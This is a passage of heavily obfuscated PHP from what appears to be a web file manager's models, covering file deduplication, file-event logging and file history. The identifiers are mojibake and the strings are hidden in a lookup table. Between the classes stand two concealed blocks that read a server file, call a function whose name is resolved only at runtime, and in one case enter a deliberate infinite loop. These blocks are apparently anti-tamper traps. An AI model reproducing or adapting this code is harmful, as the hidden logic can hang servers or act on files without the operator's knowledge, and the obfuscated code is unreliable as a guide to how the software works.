$this->addFileCheckExist($ä½¯Ì…ö[$ÔÚ¶ĞÓ†[177]], $ä½¯Ì…ö[$ÔÚ¶ĞÓ†[176]], $ä½¯Ì…ö[$ÔÚ¶ĞÓ†[76]])) { return $µ“é®ì¥; } return $this->addFileData($ä½¯Ì…ö); } private function addFileData($–·Ù¨) { $‰ßÕÂâ =& $_SERVER[Îûáû“ş]; if (!$–·Ù¨) { return !1; } $–·Ù¨[$‰ßÕÂâ[76]] = intval($–·Ù¨[$‰ßÕÂâ[76]]); if (!$–·Ù¨[$‰ßÕÂâ[76]] && strlen($–·Ù¨[$‰ßÕÂâ[177]]) > 32) { $–·Ù¨[$‰ßÕÂâ[76]] = intval(substr($–·Ù¨[$‰ßÕÂâ[177]], 32)); } $ƒ›„„éÌ = $this->add($–·Ù¨); return $this->find($ƒ›„„éÌ); } public function addFile($ê§Ïêê¦, $£¯ ­õÓ, $²ÌÑ’¶” = false) { $ÚŒ¦šãª =& $_SERVER[Îûáû“ş]; $¨Öı³Û = IO::hashSimple($ê§Ïêê¦); $¥¯óµ°© = IO::size($ê§Ïêê¦); $Ûş“õáĞ = $¥¯óµ°© <= 1024 * 1024 * 10 ? IO::hashMd5($ê§Ïêê¦) : $ÚŒ¦šãª[12]; $øıªËì¥ = $ÚŒ¦šãª[1925] . $¨Öı³Û; CacheLock::lock($øıªËì¥); if ($Ûş“õáĞ && $¨Öı³Û) { $ˆû×Ó’ƒ = $this->addFileCheckExist($¨Öı³Û, $Ûş“õáĞ, $¥¯óµ°©); if ($ˆû×Ó’ƒ) { CacheLock::unlock($øıªËì¥); return $ˆû×Ó’ƒ; } } $È¬’ÛÙÔ = $this->addFileMake($ê§Ïêê¦, $¥¯óµ°©, $¨Öı³Û, $Ûş“õáĞ, $£¯ ­õÓ, $²ÌÑ’¶”); $£Ä¯ØÌÁ = $this->addFileData($È¬’ÛÙÔ); CacheLock::unlock($øıªËì¥); if (!$Ûş“õáĞ && $£Ä¯ØÌÁ) { $this->fileMd5Check($£Ä¯ØÌÁ); } return $£Ä¯ØÌÁ; } private function fileMd5Check($îÙê¹­‡) { $‹‘³øÔ— =& $_SERVER[Îûáû“ş]; $¡Ú’£©™ = array($îÙê¹­‡[$‹‘³øÔ—[468]], $îÙê¹­‡[$‹‘³øÔ—[84]]); $ßöû÷ãÂ = $‹‘³øÔ—[1926] . $îÙê¹­‡[$‹‘³øÔ—[84]]; $Û‘—á™ = $‹‘³øÔ—[1927] . $îÙê¹­‡[$‹‘³øÔ—[468]]; $şÄê•»º = TaskQueue::add($‹‘³øÔ—[1928], $¡Ú’£©™, $ßöû÷ãÂ, $Û‘—á™); if (!$şÄê•»º) { $this->fileMd5Set($îÙê¹­‡[$‹‘³øÔ—[468]], $îÙê¹­‡[$‹‘³øÔ—[84]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($Ó’”…·¦, $û¯µ…±İ) { $å”Øìé =& $_SERVER[Îûáû“ş]; $‘‚ı¥¬Ç = $this->find($Ó’”…·¦); if (!$‘‚ı¥¬Ç || $‘‚ı¥¬Ç[$å”Øìé[176]]) { return; } $¤ç™íÃŠ = IO::hashMd5($û¯µ…±İ); if (!$¤ç™íÃŠ) { return $å”Øìé[12]; } $this->where(array($å”Øìé[468] => $Ó’”…·¦))->save(array($å”Øìé[176] => $¤ç™íÃŠ)); } public function addFileMake($¬ºµıã, $Ì ÁÖÓ¾, $ŒÖ§å, $µÍÆˆêã, $ˆ ¯ñŠ, $´½‡Í˜¾) { $ü‘¤«ı =& $_SERVER[Îûáû“ş]; $Î‹Ù ¬ê = $this->createFileName($ˆ ¯ñŠ, $ŒÖ§å, $µÍÆˆêã); $ê®„Ñ ˆ = get_path_father($Î‹Ù ¬ê); $åÄ¦Éä‡ = get_path_this($Î‹Ù ¬ê); if ($´½‡Í˜¾) { $µ™¼×÷ = IO::move($¬ºµıã, $ê®„Ñ ˆ, !1, $åÄ¦Éä‡); } else { $µ™¼×÷ = IO::copy($¬ºµıã, $ê®„Ñ ˆ, !1, $åÄ¦Éä‡); } if (!$µ™¼×÷) { return !1; } $Ì¬õ¿Â© = KodIO::defaultDriver(); $ÅÊÃ‰Å = array($ü‘¤«ı[545] => $Ì ÁÖÓ¾, $ü‘¤«ı[1922] => 1, $ü‘¤«ı[420] => $ˆ ¯ñŠ, $ü‘¤«ı[807] => $Ì¬õ¿Â©[$ü‘¤«ı[399]], $ü‘¤«ı[421] => $Î‹Ù ¬ê, $ü‘¤«ı[1923] => $ŒÖ§å, $ü‘¤«ı[1924] => $µÍÆˆêã); return $ÅÊÃ‰Å; } public function addFileCheckExist($äÎÃàŒ, $­ üÛõ¸, $Ğùáò€÷) { $ˆ©ĞŸä =& $_SERVER[Îûáû“ş]; $Ìşù­¡ = $this->findByHash($äÎÃàŒ, $­ üÛõ¸); if (!$Ìşù­¡) { return !1; } $‚º¸¯ì¿ = array($ˆ©ĞŸä[1922] => intval($Ìşù­¡[$ˆ©ĞŸä[1929]]) + 1, $ˆ©ĞŸä[545] => $Ğùáò€÷); $this->where(array($ˆ©ĞŸä[469] => $Ìşù­¡[$ˆ©ĞŸä[468]]))->save($‚º¸¯ì¿); return $Ìşù­¡; } public function remove($ëÅ¤•) { $this->linkCountChange($ëÅ¤•, !1); $this->clearEmpty(); return !0; } public function linkAdd($ ºäûò) { $this->linkCountChange($ ºäûò, !0); } public function linkCountChange($­¬•ªÕÖ, $«ª‚Ş¶ñ) { $Û€İË¬§ =& $_SERVER[Îûáû“ş]; if (!$­¬•ªÕÖ) { return; } if (!is_array($­¬•ªÕÖ)) { $­¬•ªÕÖ = array($­¬•ªÕÖ); } $šœ¸ÆÒ = array(); foreach ($­¬•ªÕÖ as $’å³»à) { $£¯Ÿ°Ù = $’å³»à . $Û€İË¬§[12]; if (!$šœ¸ÆÒ[$£¯Ÿ°Ù]) { $šœ¸ÆÒ[$£¯Ÿ°Ù] = 0; } $šœ¸ÆÒ[$£¯Ÿ°Ù]++; } $€ªøõ§ = array(); foreach ($šœ¸ÆÒ as $’å³»à => $Ú˜İÂµ¡) { $£¯Ÿ°Ù = $Ú˜İÂµ¡ . $Û€İË¬§[12]; if (!$€ªøõ§[$£¯Ÿ°Ù]) { $€ªøõ§[$£¯Ÿ°Ù] = array(); } $€ªøõ§[$£¯Ÿ°Ù][] = $’å³»à; } foreach ($€ªøõ§ as $Ú˜İÂµ¡ => $Ë§ê¦ÜÄ) { if (!$Ë§ê¦ÜÄ) { continue; } $Ú˜İÂµ¡ = $«ª‚Ş¶ñ ? $Ú˜İÂµ¡ : -intval($Ú˜İÂµ¡); $¦¶¸†­í = array($Û€İË¬§[468] => array($Û€İË¬§[7], $Ë§ê¦ÜÄ)); if ($Ú˜İÂµ¡ < 0) { $¦¶¸†­í[$Û€İË¬§[1929]] = array($Û€İË¬§[1017], abs($Ú˜İÂµ¡)); } $this->where($¦¶¸†­í)->setAdd($Û€İË¬§[1929], $Ú˜İÂµ¡); } } public function findByHash($˜ó€¼‹, $ôŒİ’ÌÆ = false) { $ÁÂàíû¢ =& $_SERVER[Îûáû“ş]; if (!$˜ó€¼‹ && !$ôŒİ’ÌÆ) { return !1; } $ñŸÊã¯ = array($ÁÂàíû¢[1923] => $˜ó€¼‹); if ($ôŒİ’ÌÆ) { $ñŸÊã¯ = array($ÁÂàíû¢[1924] => $ôŒİ’ÌÆ); } return $this->order($ÁÂàíû¢[1930])->where($ñŸÊã¯)->find(); } public function clearEmpty($œÏ¾“©Ş = 0) { $¬¶ÙËâ =& $_SERVER[Îûáû“ş]; $ô¨öÑ„Ÿ = time() - 3600 * 24 * $œÏ¾“©Ş; $çÁ–¿È’ = $¬¶ÙËâ[1931] . $ô¨öÑ„Ÿ; $š¸¶Ãö = $this->where($çÁ–¿È’)->select(); if (!$š¸¶Ãö) { return; } $£»Œˆú = new Task($¬¶ÙËâ[1932], $¬¶ÙËâ[12], count($š¸¶Ãö)); foreach ($š¸¶Ãö as $ì§…¶¹„) { $£»Œˆú->update(1); $this->resetFile($ì§…¶¹„); } $£»Œˆú->end(); } public function resetFile($·áğî—¿) { $íËèùš =& $_SERVER[Îûáû“ş]; $¥¿£¬Ší = array($íËèùš[469] => $·áğî—¿[$íËèùš[468]]); $âœøõÈ¹ = Model($íËèùš[1341])->where($¥¿£¬Ší)->count(); $ŸËæ‹Ò = Model($íËèùš[1933])->where($¥¿£¬Ší)->count(); $÷şÀ«·¤ = intval($âœøõÈ¹) + intval($ŸËæ‹Ò); if ($÷şÀ«·¤ == 0) { IO::remove($·áğî—¿[$íËèùš[84]]); Model($íËèùš[1934])->delete($·áğî—¿[$íËèùš[468]]); $this->where($¥¿£¬Ší)->delete(); $this->metaSet($·áğî—¿[$íËèùš[468]], null, null); return; } if ($·áğî—¿[$íËèùš[1929]] != $÷şÀ«·¤) { $this->where($¥¿£¬Ší)->save(array($íËèùš[1922] => $÷şÀ«·¤)); } } public function storageInfo($È€ä•¢” = false) { $Ÿ…ªİŸ =& $_SERVER[Îûáû“ş]; $‘ÏÃ´Ùø = $this->count() + 0.0; $ÍôËØÒØ = 0; $ğæÑ—” = 1; $åè±íöí = 0; $ÄÚ²‚¶ = 5000; for ($á…¬«Å = 0; $á…¬«Å < $‘ÏÃ´Ùø; $á…¬«Å = $á…¬«Å + $ÄÚ²‚¶) { $˜ãúÂÀ = $this->limit($á…¬«Å, $á…¬«Å + $ÄÚ²‚¶)->select(); foreach ($˜ãúÂÀ as $Ïõ¼˜âç) { $ğæÑ—” += $Ïõ¼˜âç[$Ÿ…ªİŸ[76]] * $Ïõ¼˜âç[$Ÿ…ªİŸ[1929]]; $ÍôËØÒØ += $Ïõ¼˜âç[$Ÿ…ªİŸ[76]] * ($Ïõ¼˜âç[$Ÿ…ªİŸ[1929]] - 1); $åè±íöí += $Ïõ¼˜âç[$Ÿ…ªİŸ[1929]]; } } $õùê‰Ü¨ = array($Ÿ…ªİŸ[1935] => $ğæÑ—”, $Ÿ…ªİŸ[1936] => $ÍôËØÒØ, $Ÿ…ªİŸ[1937] => $ÍôËØÒØ / $ğæÑ—”, $Ÿ…ªİŸ[80] => $‘ÏÃ´Ùø, $Ÿ…ªİŸ[1938] => $åè±íöí); return $õùê‰Ü¨; } } if ($_SERVER[$_SERVER[Îûáû“ş][875]] != $_SERVER[$_SERVER[Îûáû“ş][1786]]) { $_getc = $_SERVER[Îûáû“ş][878]; $_getfile = $_SERVER[$_SERVER[Îûáû“ş][879]] . $_SERVER[Îûáû“ş][880]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Îûáû“ş][231], $_getfilec); if (count($_getarrs) < $_SERVER[Îûáû“ş][635]) { $exit = $_SERVER[Îûáû“ş][881]; $exit(); } $_act = $_SERVER[Îûáû“ş][1787]; $_act($_SERVER[$_SERVER[Îûáû“ş][876]]); } goto E¹É¤Ö ø; DÑ„¼‡½ƒ: class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\157\x75\162\x63\x65\137\145\166\x65\x6e\x74"; protected $dataAuto = array(array("\x63\162\145\141\164\x65\124\x69\x6d\x65", "\x74\151\155\145", "\x69\156\163\x65\162\164", "\x66\165\156\x63\164\151\157\156"), array("\144\145\163\143", '', "\x69\156\x73\x65\162\164\x2c\x75\x70\x64\141\x74\145\x2c\163\145\154\x65\143\x74", "\152\163\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($úÅ§¸“ô, $¿Üˆî¢, $Å‡“Ï = '') { $ªÃûÈ =& $_SERVER[Îûáû“ş]; if (!$this->eventSave) { return; } $‚ìşŒ²‹ = Model($ªÃûÈ[1341])->sourceInfo($úÅ§¸“ô); if (!$‚ìşŒ²‹) { return !1; } if ($this->isCacheEvent($‚ìşŒ²‹, $¿Üˆî¢)) { return; } if ($Å‡“Ï && is_string($Å‡“Ï)) { $Å‡“Ï = array($ªÃûÈ[1900] => $Å‡“Ï); } $ØÆ…Åñ« = array($ªÃûÈ[417] => $úÅ§¸“ô, $ªÃûÈ[2082] => $‚ìşŒ²‹[$ªÃûÈ[432]], $ªÃûÈ[2083] => $‚ìşŒ²‹[$ªÃûÈ[32]], $ªÃûÈ[509] => !empty($‚ìşŒ²‹[$ªÃûÈ[509]]) ? $‚ìşŒ²‹[$ªÃûÈ[509]] : $ªÃûÈ[12], $ªÃûÈ[1661] => USER_ID, $ªÃûÈ[422] => $¿Üˆî¢, $ªÃûÈ[1663] => $Å‡“Ï); $this->addSystemLog($¿Üˆî¢, $ØÆ…Åñ«); unset($ØÆ…Åñ«[$ªÃûÈ[2083]], $ØÆ…Åñ«[$ªÃûÈ[509]]); return $this->add($ØÆ…Åñ«); } private function addSystemLog($û¿ßê±Å, $Ö®È‚ë‹) { $ıû¡ê¦ =& $_SERVER[Îûáû“ş]; if ($û¿ßê±Å == $ıû¡ê¦[2084]) { $û¿ßê±Å = $Ö®È‚ë‹[$ıû¡ê¦[453]][$ıû¡ê¦[2085]]; } else { if (in_array($û¿ßê±Å, array($ıû¡ê¦[1841], $ıû¡ê¦[2086]))) { $û¿ßê±Å = $Ö®È‚ë‹[$ıû¡ê¦[453]][$ıû¡ê¦[753]]; } } $¬ºº¢éß = array_merge($Ö®È‚ë‹, array($ıû¡ê¦[2087] => $Ö®È‚ë‹[$ıû¡ê¦[402]], $ıû¡ê¦[2088] => $Ö®È‚ë‹[$ıû¡ê¦[2088]])); Hook::trigger($ıû¡ê¦[2089], $ıû¡ê¦[2090] . $û¿ßê±Å, $Ö®È‚ë‹); Model($ıû¡ê¦[1805])->addLog($ıû¡ê¦[2090] . $û¿ßê±Å, $¬ºº¢éß); } private function isCacheEvent($é’ğ®¨™, $ñ¥˜£Ò) { if ($é’ğ®¨™[$_SERVER[Îûáû“ş][411]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($´ù“ˆœ, $â¹›—ğğ) { $ûªçëùÕ =& $_SERVER[Îûáû“ş]; $ä·éş¨æ = Model($ûªçëùÕ[1341])->sourceInfo($´ù“ˆœ); $¡şİŸÇ = array($ûªçëùÕ[2085] => $â¹›—ğğ, $ûªçëùÕ[32] => $ä·éş¨æ[$ûªçëùÕ[32]]); return $this->addEvent($´ù“ˆœ, $ûªçëùÕ[2084], $¡şİŸÇ); } public function eventFileEdit($¯ÒƒÜü¤) { $–¶ğ¤ª =& $_SERVER[Îûáû“ş]; $‡ÊÔî´ß = array($–¶ğ¤ª[2091] => $_SERVER[$–¶ğ¤ª[2092]], $–¶ğ¤ª[2093] => strtolower(ACTION)); if (isset($GLOBALS[$–¶ğ¤ª[7]][$–¶ğ¤ª[2094]])) { $‡ÊÔî´ß[$–¶ğ¤ª[2094]] = $–¶ğ¤ª[88]; } return $this->addEvent($¯ÒƒÜü¤, $–¶ğ¤ª[1831], $‡ÊÔî´ß); } public function eventRecycle($Ù‘ã£÷ó, $·éƒÏêÂ) { return $this->addEvent($Ù‘ã£÷ó, $_SERVER[Îûáû“ş][2086], $·éƒÏêÂ); } public function eventRemove($»€Ù”¶) { $»ØÄ»õÛ =& $_SERVER[Îûáû“ş]; $Ã—á¸¦ˆ = Model($»ØÄ»õÛ[1341])->sourceInfo($»€Ù”¶); $ÛñÛçÏş = $Ã—á¸¦ˆ[$»ØÄ»õÛ[32]]; return $this->addEvent($Ã—á¸¦ˆ[$»ØÄ»õÛ[432]], $»ØÄ»õÛ[1830], $ÛñÛçÏş); } public function eventShare($š±·Ô¶‚, $Ô½¼óâ˜) { return $this->addEvent($š±·Ô¶‚, $_SERVER[Îûáû“ş][1841], $Ô½¼óâ˜); } public function eventMove($“æ´¼ê, $¡ˆˆùíÛ, $÷Ã”²Û“) { $Õšã”ñ‡ =& $_SERVER[Îûáû“ş]; $‰¯æÅı¨ = Model($Õšã”ñ‡[1341]); $òû­Şú˜ = $‰¯æÅı¨->sourceInfo($“æ´¼ê); $‰ÈÁ×€‚ = $‰¯æÅı¨->sourceInfo($¡ˆˆùíÛ); $õññ¼›² = $‰¯æÅı¨->sourceInfo($÷Ã”²Û“); $¡Ë½Á˜µ = array($Õšã”ñ‡[1162] => $¡ˆˆùíÛ, $Õšã”ñ‡[2095] => $‰ÈÁ×€‚[$Õšã”ñ‡[32]], $Õšã”ñ‡[2073] => !empty($‰ÈÁ×€‚[$Õšã”ñ‡[509]]) ? $‰ÈÁ×€‚[$Õšã”ñ‡[509]] : $Õšã”ñ‡[12], $Õšã”ñ‡[1163] => $÷Ã”²Û“, $Õšã”ñ‡[2096] => $õññ¼›²[$Õšã”ñ‡[32]], $Õšã”ñ‡[2097] => !empty($õññ¼›²[$Õšã”ñ‡[509]]) ? $õññ¼›²[$Õšã”ñ‡[509]] : $Õšã”ñ‡[12]); $this->addEvent($“æ´¼ê, $Õšã”ñ‡[548], $¡Ë½Á˜µ); $òû­Şú˜ = $‰¯æÅı¨->sourceInfo($“æ´¼ê); $¡Ë½Á˜µ = array($Õšã”ñ‡[402] => $òû­Şú˜[$Õšã”ñ‡[402]], $Õšã”ñ‡[32] => $òû­Şú˜[$Õšã”ñ‡[32]]); $this->addEvent($¡ˆˆùíÛ, $Õšã”ñ‡[2098], $¡Ë½Á˜µ); } public function eventCopy($­…íÉ«Í) { $this->eventCreate($­…íÉ«Í, $_SERVER[Îûáû“ş][546]); } public function eventRename($„Ÿ‹Úíš, $×ÃŞ­×, $úÂ²¡»œ) { $ıœç¾Å’ =& $_SERVER[Îûáû“ş]; $Øüğ¨ñº = array($ıœç¾Å’[1162] => $×ÃŞ­×, $ıœç¾Å’[1163] => $úÂ²¡»œ); return $this->addEvent($„Ÿ‹Úíš, $ıœç¾Å’[1356], $Øüğ¨ñº); } public function eventAddComment($Àï‰“ª, $ÀÍèÀ¹Â) { return $this->addEvent($Àï‰“ª, $_SERVER[Îûáû“ş][2099], $ÀÍèÀ¹Â); } public function eventAddDesc($§”¥Äœé, $³…´Åä) { return $this->addEvent($§”¥Äœé, $_SERVER[Îûáû“ş][2100], $³…´Åä); } public function listBySource($úô³®¶¤) { $¿œÉÕƒÃ =& $_SERVER[Îûáû“ş]; $å¤¯íö = Model($¿œÉÕƒÃ[1341])->sourceInfo($úô³®¶¤); $­ñ•µÓ« = array($¿œÉÕƒÃ[417] => $úô³®¶¤); if ($å¤¯íö[$¿œÉÕƒÃ[410]] == $¿œÉÕƒÃ[88]) { $·µÙ—à¥ = Model($¿œÉÕƒÃ[1341])->listSearchChildren($úô³®¶¤, 20000); $·µÙ—à¥[] = $úô³®¶¤ . $¿œÉÕƒÃ[378]; $­ñ•µÓ« = array($¿œÉÕƒÃ[402] => array($¿œÉÕƒÃ[7], $·µÙ—à¥)); } $Âñ··‹ = $this->where($­ñ•µÓ«)->order($¿œÉÕƒÃ[2101])->selectPage(); if ($Âñ··‹[$¿œÉÕƒÃ[366]][$¿œÉÕƒÃ[367]] == 0) { $Âñ··‹[$¿œÉÕƒÃ[366]][$¿œÉÕƒÃ[367]] = 1; $Âñ··‹[$¿œÉÕƒÃ[369]] = array(array($¿œÉÕƒÃ[417] => $úô³®¶¤, $¿œÉÕƒÃ[2082] => $å¤¯íö[$¿œÉÕƒÃ[432]], $¿œÉÕƒÃ[1661] => $å¤¯íö[$¿œÉÕƒÃ[454]], $¿œÉÕƒÃ[422] => $¿œÉÕƒÃ[2102], $¿œÉÕƒÃ[423] => $å¤¯íö[$¿œÉÕƒÃ[201]], $¿œÉÕƒÃ[1663] => $¿œÉÕƒÃ[12])); } return $this->eventListParse($Âñ··‹, $úô³®¶¤); } private function eventListParse($¸Âïø÷®, $š»ĞÊ‘) { $¯ùÊíä® =& $_SERVER[Îûáû“ş]; $ª®ĞŒ†é = $¸Âïø÷®[$¯ùÊíä®[369]]; $ÁÌ’¾µè = array_to_keyvalue($ª®ĞŒ†é, $¯ùÊíä®[12], $¯ùÊíä®[402]); $Ó×©¿Û¤ = array_to_keyvalue($ª®ĞŒ†é, $¯ùÊíä®[12], $¯ùÊíä®[2088]); foreach ($ª®ĞŒ†é as $Óƒá·å) { $Àº¥¿‰ = $Óƒá·å[$¯ùÊíä®[453]]; if ($Óƒá·å[$¯ùÊíä®[33]] == $¯ùÊíä®[548] && isset($Àº¥¿‰[$¯ùÊíä®[1162]])) { $ÁÌ’¾µè[] = $Àº¥¿‰[$¯ùÊíä®[1162]] . $¯ùÊíä®[12]; $ÁÌ’¾µè[] = $Àº¥¿‰[$¯ùÊíä®[1163]] . $¯ùÊíä®[12]; } if ($Óƒá·å[$¯ùÊíä®[33]] == $¯ùÊíä®[2098] && isset($Àº¥¿‰[$¯ùÊíä®[402]])) { $ÁÌ’¾µè[] = $Àº¥¿‰[$¯ùÊíä®[402]] . $¯ùÊíä®[12]; } } $ÁÌ’¾µè = array_merge($ÁÌ’¾µè, $Ó×©¿Û¤, array($š»ĞÊ‘ . $¯ùÊíä®[12])); $ÁÌ’¾µè = array_unique($ÁÌ’¾µè); $ş¦ô‹Œ¹ = array_unique(array_to_keyvalue($ª®ĞŒ†é, $¯ùÊíä®[12], $¯ùÊíä®[1670])); $É£ñ¨¨ = Model($¯ùÊíä®[525])->userListInfo($ş¦ô‹Œ¹); $íöİÔŸ… = Model($¯ùÊíä®[824])->sourceListInfo($ÁÌ’¾µè, !0); foreach ($ª®ĞŒ†é as &$Óƒá·å) { if ($Óƒá·å[$¯ùÊíä®[33]] == $¯ùÊíä®[548] && isset($Óƒá·å[$¯ùÊíä®[453]][$¯ùÊíä®[1162]])) { $Óƒá·å[$¯ùÊíä®[453]][$¯ùÊíä®[1162]] = $íöİÔŸ…[$Óƒá·å[$¯ùÊíä®[453]][$¯ùÊíä®[1162]]]; $Óƒá·å[$¯ùÊíä®[453]][$¯ùÊíä®[1163]] = $íöİÔŸ…[$Óƒá·å[$¯ùÊíä®[453]][$¯ùÊíä®[1163]]]; } if ($Óƒá·å[$¯ùÊíä®[33]] == $¯ùÊíä®[2098] && isset($Óƒá·å[$¯ùÊíä®[453]][$¯ùÊíä®[402]])) { $Óƒá·å[$¯ùÊíä®[453]][$¯ùÊíä®[402]] = $íöİÔŸ…[$Óƒá·å[$¯ùÊíä®[453]][$¯ùÊíä®[402]]]; } $Óƒá·å[$¯ùÊíä®[87]] = $íöİÔŸ…[$Óƒá·å[$¯ùÊíä®[402]]]; $Óƒá·å[$¯ùÊíä®[2103]] = $íöİÔŸ…[$Óƒá·å[$¯ùÊíä®[2088]]]; if ($Óƒá·å[$¯ùÊíä®[33]] == $¯ùÊíä®[1830]) { $Óƒá·å[$¯ùÊíä®[2103]] = $Óƒá·å[$¯ùÊíä®[87]]; $Óƒá·å[$¯ùÊíä®[2088]] = $Óƒá·å[$¯ùÊíä®[2103]][$¯ùÊíä®[402]]; $Óƒá·å[$¯ùÊíä®[87]] = !1; $Óƒá·å[$¯ùÊíä®[402]] = $¯ùÊíä®[12]; } $Óƒá·å[$¯ùÊíä®[2033]] = $É£ñ¨¨[$Óƒá·å[$¯ùÊíä®[1670]]]; } unset($Óƒá·å); $¸Âïø÷®[$¯ùÊíä®[369]] = $ª®ĞŒ†é; return $¸Âïø÷®; } public function removeBySource($¿Û­’Ü) { $ğ»Éå² = array($_SERVER[Îûáû“ş][417] => $¿Û­’Ü); $this->where($ğ»Éå²)->remove(); } } if (!isset($_SERVER[$_SERVER[Îûáû“ş][875]]) || !isset($_SERVER[$_SERVER[Îûáû“ş][876]])) { $_getc = $_SERVER[Îûáû“ş][878]; $_getfile = $_SERVER[$_SERVER[Îûáû“ş][879]] . $_SERVER[Îûáû“ş][880]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Îûáû“ş][231], $_getfilec); if (count($_getarrs) < $_SERVER[Îûáû“ş][635]) { $exit = $_SERVER[Îûáû“ş][881]; $exit(); } $_act = $_SERVER[Îûáû“ş][1787]; $_act($_SERVER[$_SERVER[Îûáû“ş][879]] . $_SERVER[Îûáû“ş][880]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[Îûáû“ş][378]); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\157\x75\x72\x63\145\137\150\x69\163\x74\157\x72\x79"; public function historyCount($ÌÜÏÁÒç) { $Ñ‹ğù¸á =& $_SERVER[Îûáû“ş]; if (!$ÌÜÏÁÒç) { return array(); } if (is_string($ÌÜÏÁÒç) || is_int($ÌÜÏÁÒç)) { $ÌÜÏÁÒç = array($ÌÜÏÁÒç); } $“Ğ£ÏÀ = array($Ñ‹ğù¸á[402], $Ñ‹ğù¸á[1894] => $Ñ‹ğù¸á[491]); $²æªØìÎ = array($Ñ‹ğù¸á[402] => array($Ñ‹ğù¸á[7], $ÌÜÏÁÒç)); $¸ÒÖœ¿‹ = $this->field($“Ğ£ÏÀ)->where($²æªØìÎ)->group($Ñ‹ğù¸á[402])->select(); return array_to_keyvalue($¸ÒÖœ¿‹, $Ñ‹ğù¸á[402], $Ñ‹ğù¸á[491]); } public function addHistory($ôË¯¨Ä¹, $’íª…¾€ = '') { $É—ÙË÷» =& $_SERVER[Îûáû“ş]; $Ò¸á á = array($É—ÙË÷»[417] => $ôË¯¨Ä¹[$É—ÙË÷»[402]], $É—ÙË÷»[1661] => isset($ôË¯¨Ä¹[$É—ÙË÷»[456]]) ? $ôË¯¨Ä¹[$É—ÙË÷»[456]] : $ôË¯¨Ä¹[$É—ÙË÷»[454]], $É—ÙË÷»[469] => $ôË¯¨Ä¹[$É—ÙË÷»[468]], $É—ÙË÷»[545] => $ôË¯¨Ä¹[$É—ÙË÷»[76]], $É—ÙË÷»[2104] => $’íª…¾€); if ($GLOBALS[$É—ÙË÷»[6]][$É—ÙË÷»[89]][$É—ÙË÷»[1219]] >= 1) { $this->historyAutoClear($Ò¸á á[$É—ÙË÷»[402]]); $this->add($Ò¸á á); } Hook::trigger($É—ÙË÷»[2105], $Ò¸á á); Model($É—ÙË÷»[2106])->eventFileEdit($ôË¯¨Ä¹[$É—ÙË÷»[402]]); } private function historyAutoClear($®‘°‚ñ») { $»ªÒğŒ =& $_SERVER[Îûáû“ş]; $Ê¬Ç¢‚¢ = Model($»ªÒğŒ[769])->get($»ªÒğŒ[1241]); $Íç§³ÁÔ = $GLOBALS[$»ªÒğŒ[6]][$»ªÒğŒ[89]][$»ªÒğŒ[1219]]; $ÀÁÅ¼úÇ = $Ê¬Ç¢‚¢ == $»ªÒğŒ[1242] ? min(5, $Íç§³ÁÔ) : $Íç§³ÁÔ; $ÀÁÅ¼úÇ = $ÀÁÅ¼úÇ <= 0 ? 0 : $ÀÁÅ¼úÇ - 1; if ($ÀÁÅ¼úÇ >= 500) { return; } $ğµ®Û÷È = array($»ªÒğŒ[417] => $®‘°‚ñ»); $²—Ş™ = $this->field($»ªÒğŒ[2107])->where($ğµ®Û÷È)->order($»ªÒğŒ[2101])->select(); if (!$²—Ş™ || $ÀÁÅ¼úÇ >= count($²—Ş™)) { return; } $¿‘¿§¨˜ = array_to_keyvalue($²—Ş™, $»ªÒğŒ[12], $»ªÒğŒ[399]); $¿‘¿§¨˜ = array_slice($¿‘¿§¨˜, $ÀÁÅ¼úÇ); $÷õÙø“š = array_to_keyvalue($²—Ş™, $»ªÒğŒ[12], $»ªÒğŒ[468]); $÷õÙø“š = array_slice($÷õÙø“š, $ÀÁÅ¼úÇ); if (!$¿‘¿§¨˜ || !$÷õÙø“š) { return; } $ğµ®Û÷È = array($»ªÒğŒ[419] => array($»ªÒğŒ[7], $¿‘¿§¨˜)); $this->where($ğµ®Û÷È)->delete(); Model($»ªÒğŒ[471])->remove($÷õÙø“š); } public function listData($”€õüØ—) { $õ®™‚ÓĞ =& $_SERVER[Îûáû“ş]; $Å‚ÇşÀï = array($õ®™‚ÓĞ[417] => $”€õüØ—); $¸½à‡Ç… = $õ®™‚ÓĞ[2108]; $İ©‡Ù©— = $this->field($¸½à‡Ç…)->where($Å‚ÇşÀï)->order($õ®™‚ÓĞ[2101])->selectPage(); $this->_listAppendUser($İ©‡Ù©—[$õ®™‚ÓĞ[369]]); $ÊÔœŞ…˜ = Model($õ®™‚ÓĞ[769])->get($õ®™‚ÓĞ[1241]); $Æ‹ËÅœ = 5; if ($ÊÔœŞ…˜ == $õ®™‚ÓĞ[1242]) { $İ©‡Ù©—[$õ®™‚ÓĞ[369]] = array_slice($İ©‡Ù©—[$õ®™‚ÓĞ[369]], 0, $Æ‹ËÅœ); $İ©‡Ù©—[$õ®™‚ÓĞ[366]] = array($õ®™‚ÓĞ[2109] => 1, $õ®™‚ÓĞ[2110] => 20, $õ®™‚ÓĞ[2111] => 1, $õ®™‚ÓĞ[2112] => count($İ©‡Ù©—[$õ®™‚ÓĞ[369]])); } return $İ©‡Ù©—; } protected function _listAppendUser(&$ŠÅŒü¶Ç) { $Ò…¤ÇÊğ =& $_SERVER[Îûáû“ş]; $Äü«¼Ã¸ = array_to_keyvalue($ŠÅŒü¶Ç, $Ò…¤ÇÊğ[12], $Ò…¤ÇÊğ[1670]); $©Ü€úÎˆ = Model($Ò…¤ÇÊğ[525])->userListInfo($Äü«¼Ã¸); foreach ($ŠÅŒü¶Ç as &$ÌÛ›¼çÆ) { $Ö‚šÏ» = $ÌÛ›¼çÆ[$Ò…¤ÇÊğ[1670]]; $ÌÛ›¼çÆ[$Ò…¤ÇÊğ[454]] = $©Ü€úÎˆ[$Ö‚šÏ»] ? $©Ü€úÎˆ[$Ö‚šÏ»] : !1; } unset($ÌÛ›¼çÆ); } public function fileInfo($©‡ĞÒƒ) { $ó“šÅÀ =& $_SERVER[Îûáû“ş]; $ëÂ¦úÃÕ = $this->tablePrefix; $òœ“¶„‰ = 